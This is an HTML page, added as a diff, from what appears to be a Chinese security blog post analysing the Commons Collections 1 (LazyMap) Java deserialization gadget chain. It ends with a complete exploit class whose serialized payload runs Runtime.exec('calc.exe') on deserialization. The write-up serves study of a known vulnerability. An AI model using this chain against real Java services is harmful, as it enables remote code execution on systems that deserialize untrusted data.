@@ -1,0 +1,312 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>【Java反序列化】CommonCollections1利用链(LazyMap) | Limpid</title>
+<link rel="shortcut icon" href="https://limpid94.github.io/favicon.ico?v=1663148874314">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://limpid94.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="【Java反序列化】CommonCollections1利用链(LazyMap) | Limpid - Atom Feed" href="https://limpid94.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="调用链
+	Gadget chain:
+		ObjectInputStream.readObject()
+			AnnotationInvocationHandler.readObject()
+				Map(Proxy).entrySet(..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://limpid94.github.io">
+  <img class="avatar" src="https://limpid94.github.io/images/avatar.png?v=1663148874314" alt="">
+  </a>
+  <h1 class="site-title">
+    Limpid
+  </h1>
+  <p class="site-description">
+    Keep thinking , keeping learning
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              【Java反序列化】CommonCollections1利用链(LazyMap)
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-02-18
+              </span>
+              <span>
+                4 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h2 id="调用链">调用链</h2>
+<pre><code>	Gadget chain:
+		ObjectInputStream.readObject()
+			AnnotationInvocationHandler.readObject()
+				Map(Proxy).entrySet()
+					AnnotationInvocationHandler.invoke()
+						LazyMap.get()
+							ChainedTransformer.transform()
+								ConstantTransformer.transform()
+								InvokerTransformer.transform()
+									Method.invoke()
+										Class.getMethod()
+								InvokerTransformer.transform()
+									Method.invoke()
+										Runtime.getRuntime()
+								InvokerTransformer.transform()
+									Method.invoke()
+										Runtime.exec()
+</code></pre>
+<p>从<code>LazyMap.get()</code>往后的调用链和TransformedMap的一样。于是后面的分析之分析有差异的地方。</p>
+<h2 id="调用链分析">调用链分析</h2>
+<p>同样，当查找到ChainedTransformer的transform时依旧是继续往下查找何处调用了transform，结果中显示LazyMap的get方法调用了：<br>
+<img src="https://limpid94.github.io/post-images/1645160975046.PNG" alt="" loading="lazy"></p>
+<pre><code class="language-java">    public Object get(Object key) {
+        // create value for key if key is not currently in the map
+        if (map.containsKey(key) == false) {
+            Object value = factory.transform(key);
+            map.put(key, value);
+            return value;
+        }
+        return map.get(key);
+    }
+</code></pre>
+<p>这里的get方法主要逻辑是：当get一个不存在的key时会将key通过Transformer产生value，然后存储到map中并返回value，因此造成了命令执行。<br>
+然后查找何处调用了get方法。经过查找发现AnnotationInvocationHandler的invoke方法中调用了get方法，并且memberValues是Map类型而且还是可控的：</p>
+<pre><code class="language-java">    public Object invoke(Object proxy, Method method, Object[] args) {
+        String member = method.getName();
+        Class&lt;?&gt;[] paramTypes = method.getParameterTypes();
+
+        // Handle Object and Annotation methods
+        if (member.equals(&quot;equals&quot;) &amp;&amp; paramTypes.length == 1 &amp;&amp;
+            paramTypes[0] == Object.class)
+            return equalsImpl(args[0]);
+        if (paramTypes.length != 0)
+            throw new AssertionError(&quot;Too many parameters for an annotation method&quot;);
+
+        switch(member) {
+        case &quot;toString&quot;:
+            return toStringImpl();
+        case &quot;hashCode&quot;:
+            return hashCodeImpl();
+        case &quot;annotationType&quot;:
+            return type;
+        }
+
+        // Handle annotation member accessors
+        Object result = memberValues.get(member);
+
+        if (result == null)
+            throw new IncompleteAnnotationException(type, member);
+
+        if (result instanceof ExceptionProxy)
+            throw ((ExceptionProxy) result).generateException();
+
+        if (result.getClass().isArray() &amp;&amp; Array.getLength(result) != 0)
+            result = cloneArray(result);
+
+        return result;
+    }
+</code></pre>
+<p>然而invoke是动态代理执行时默认调用的，所以需要构造一个动态代理来调用AnnotationInvocationHandler的invoke方法。</p>
+<pre><code class="language-java">Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},  invocationHandler);
+</code></pre>
+<p>通过动态代理获取的返回值不能 直接序列化和反序列化，因此需要再次使用AnnotationInvocationHandler来对其进行包装。</p>
+<h2 id="完整exp">完整EXP</h2>
+<pre><code class="language-java">package cc.commonscollections;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Proxy;
+import java.util.HashMap;
+import java.util.Map;
+import java.util.Properties;
+
+public class CommonCollections1LazyMap {
+    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException {
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;,new Class[]{String.class,Class[].class},new Object[]{&quot;getRuntime&quot;,null}),
+                new InvokerTransformer(&quot;invoke&quot;,new Class[]{Object.class,Object[].class},new Object[]{null,null}),
+                new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new Object[]{&quot;calc.exe&quot;})
+        };
+
+        Transformer chainedTransformer = new ChainedTransformer(transformers);
+        Map innerMap = new HashMap();
+//        innerMap.put(&quot;value&quot;,&quot;1234&quot;);
+        Map outterMap = LazyMap.decorate(innerMap,chainedTransformer);
+
+        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor constructor = c.getDeclaredConstructor(Class.class,Map.class);
+        constructor.setAccessible(true);
+        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Override.class, outterMap);
+
+        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},  invocationHandler);
+
+        Object o = constructor.newInstance(Override.class, mapProxy);
+
+        mySeriable(o);
+        myDeseriable();
+
+
+
+    }
+
+    public static void mySeriable(Object obj) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser2.bin&quot;));
+        oos.writeObject(obj);
+    }
+
+    public static Object myDeseriable() throws IOException, ClassNotFoundException {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser2.bin&quot;));
+        return ois.readObject();
+    }
+
+}
+
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E8%B0%83%E7%94%A8%E9%93%BE">调用链</a></li>
+<li><a href="#%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90">调用链分析</a></li>
+<li><a href="#%E5%AE%8C%E6%95%B4exp">完整EXP</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://limpid94.github.io/post/java-fan-xu-lie-hua-commoncollections1-li-yong-lian/">
+              <h3 class="post-title">
+                【Java反序列化】CommonCollections1利用链
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by Limpid .
+  <a class="rss" href="https://limpid94.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
